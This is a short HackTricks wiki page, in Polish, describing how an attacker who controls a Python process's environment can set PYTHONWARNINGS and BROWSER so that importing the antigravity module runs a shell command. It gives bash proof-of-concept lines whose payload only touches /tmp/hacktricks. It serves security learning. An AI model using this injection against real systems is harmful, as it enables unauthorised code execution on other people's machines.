# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## Za pomocą zmiennych środowiskowych `PYTHONWARNINGS` i `BROWSER`

Jeśli atakujący może kontrolować środowisko procesu Python, połączenie zmiennych `PYTHONWARNINGS` i `BROWSER` może uruchomić wykonywanie poleceń, gdy Python importuje moduł `antigravity` podczas przetwarzania spreparowanej opcji ostrzeżenia. Technika ta opiera się na otwieraniu adresu URL przez `antigravity` za pomocą modułu Python `webbrowser`, który uwzględnia zmienną środowiskową `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## References

- [1] [Hacking ze zmiennymi środowiskowymi - elttam](https://www.elttam.com/blog/env/)
{{#include ../../../banners/hacktricks-training.md}}
